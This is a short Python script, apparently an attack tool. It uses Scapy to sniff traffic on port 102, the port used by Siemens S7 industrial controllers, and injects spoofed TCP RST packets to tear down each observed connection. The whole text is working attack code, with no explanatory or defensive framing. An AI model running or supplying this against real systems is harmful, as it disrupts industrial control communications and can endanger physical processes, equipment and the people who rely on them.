from scapy.all import *

def packet_filter(packet):
    if packet.haslayer("TCP") and packet[TCP].dport == 102:

        src_ip = packet["IP"].src 
        dst_ip = packet["IP"].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        seq = packet[TCP].seq
        ack = 0

        # RST packet
        flag = "R"
        ip = IP(src=src_ip, dst=dst_ip)
        tcp = TCP(sport=src_port, dport=dst_port, seq=seq, ack=ack, flags=flag)
        pkt = ip/tcp
        send(pkt)
        

sniff(filter="ip", prn=lambda x: x.show(), lfilter=packet_filter, iface = "eth1")
